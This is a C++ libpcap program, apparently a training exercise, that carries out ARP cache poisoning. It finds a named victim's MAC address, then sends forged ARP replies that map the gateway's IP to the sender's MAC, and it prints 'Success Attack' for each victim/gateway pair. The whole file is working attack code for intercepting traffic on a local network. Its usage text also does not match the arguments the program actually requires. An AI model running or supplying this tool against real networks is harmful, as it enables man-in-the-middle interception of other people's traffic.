#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <unistd.h>
#include <string.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/ether.h>


#define MAC2STR(a) (a)[0], (a)[1], (a)[2], (a)[3], (a)[4], (a)[5]
#define MACSTR "%02x:%02x:%02x:%02x:%02x:%02x"

#define IP2STR(a) (a)[0], (a)[1], (a)[2], (a)[3]
#define IPSTR "%u.%u.%u.%u"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void GetMyInfo(char* ip, char* mac, char* dev);
int GetYourMac(pcap_t* handle, char* myIp, char* myMac, char* yourIp, char* yourMac);
void SendArpPacket(int mode, pcap_t* handle, char* eth_smac, char* eth_dmac, char* arp_smac, char* arp_sip,char* arp_tmac, char* arp_tip);

EthArpPacket packet;

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

void GetMyInfo(char* ip, char* mac, char* dev){
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;

	memcpy(ifr.ifr_name, dev, IFNAMSIZ -1);
    
    ioctl(fd, SIOCGIFADDR, &ifr);
    strcpy(ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    printf("[MY IP ADDR = %s]\n", ip);

	ioctl(fd, SIOCGIFHWADDR, &ifr);
	sprintf(mac,MACSTR,MAC2STR((unsigned char*)(ifr.ifr_hwaddr.sa_data)));
    printf("[MY MAC ADDR = %s]\n", mac);

	close(fd);
	return;
}


int GetYourMac(pcap_t* handle, char* myIp, char* myMac, char* yourIp, char* yourMac){
	// mode : 0 = request, 1 = reply
	char broadcast[20] = "ff:ff:ff:ff:ff:ff";
	char unknown[20] ="00:00:00:00:00:00";


	//eth_smac, eth_dmac, arp_smac, arp_sip, arp_tmac, arp_tip
	struct pcap_pkthdr* header;
	const u_char* packet2;

	SendArpPacket(0, handle, myMac, broadcast, myMac, myIp, unknown, yourIp);
	
	int res = pcap_next_ex(handle, &header, &packet2);
	if (res == 0) return 0;
	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
	}
	
	EthArpPacket* yourPacket;

	yourPacket = (struct EthArpPacket *)packet2;

	sprintf(yourMac, MACSTR, MAC2STR((u_char*)(yourPacket->arp_.smac_)));

	printf("[VICTIM MAC ADDR = %s]\n",yourMac);

	return 1;
}


void SendArpPacket(int mode, pcap_t* handle, char* eth_smac, char* eth_dmac, char* arp_smac, char* arp_sip,char* arp_tmac, char* arp_tip){
	// mode : 0 = request, 1 = reply
	
	packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if(mode == 0){
        packet.arp_.op_ = htons(ArpHdr::Request);
    }else if(mode == 1){
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    packet.arp_.smac_ = Mac(arp_smac);
    packet.arp_.sip_ = htonl(Ip(arp_sip));
    packet.arp_.tmac_ = Mac(arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arp_tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;

}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];

	char* yourIp; //you == victim
	char* gatewayIp; //gateway
	char myIp[20] = {0,}; //my
	
	char yourMac[20] = {0,}; //you == victim
	char gatewayMac[20] = {0,}; //gateway
	char myMac[20] = {0,}; //my 0

	char errbuf[PCAP_ERRBUF_SIZE];

	GetMyInfo(myIp, myMac, dev);
	

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	for(int i=1;i<argc/2;i++){
		yourIp = argv[2*i];
		gatewayIp = argv[2*i+1];
		

		if(!GetYourMac(handle, myIp, myMac, yourIp, yourMac)){
			fprintf(stderr, "couldn't get victim mac address (%s)\n",errbuf);
		}
		
		SendArpPacket(1, handle, myMac, yourMac, myMac, gatewayIp, yourMac, yourIp);
		printf("Success Attack\n");
	}

	pcap_close(handle);
}
